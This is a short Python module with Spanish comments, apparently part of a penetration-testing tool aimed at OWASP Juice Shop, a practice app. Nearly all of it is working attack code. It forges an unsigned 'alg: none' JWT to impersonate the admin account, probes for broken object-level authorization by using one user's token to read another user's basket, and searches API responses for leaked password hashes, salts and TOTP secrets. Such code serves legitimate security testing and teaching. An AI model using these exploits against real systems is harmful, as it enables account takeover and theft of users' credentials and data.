import requests
import base64
import json

def run_api_abuse_module(target_url, user_a_token, user_b_id):
    print("[*] Ejecutando Módulo Abuso API...")

    # 1. Manipulación de Cabecera: Forzar algoritmo inseguro
    header_none = base64.b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip("=")
    original_payload = base64.b64encode(json.dumps({"email": "admin@juice-sh.op"}).encode()).decode().rstrip("=")
    
    # 2. Reconstrucción del Token sin firma (nótese el punto final vacío)
    forged_token = f"{header_none}.{original_payload}."
    
    # 3. Intento de acceso autenticado
    headers = {"Authorization": f"Bearer {forged_token}"}
    try:
        # Nota: Usamos un endpoint genérico para el test
        requests.get(f"{target_url}/rest/basket/1", headers=headers)
    except: pass

    # BOLA: Usar Credenciales A para acceder al Recurso B
    headers_bola = {"Authorization": f"Bearer {user_a_token}"}
    target_resource = f"/api/BasketItems/{user_b_id}"
    
    try:
        response = requests.get(f"{target_url}{target_resource}", headers=headers_bola)
        # Si devuelve 200 OK en lugar de 403 Forbidden, la validación de propiedad falla
        if response.status_code == 200:
            print("[!] Vulnerabilidad BOLA confirmada.")
    except: pass

    sensitive_patterns = ["password", "salt", "totpSecret", "hash"]
    try:
        response = requests.get(f"{target_url}/api/Products")
        data_dump = response.text
        # Búsqueda de patrones en la respuesta JSON cruda
        found_leaks = [key for key in sensitive_patterns if key in data_dump]
        
        if found_leaks:
            print(f"[!] Fuga de información detectada: {found_leaks}")
    except: pass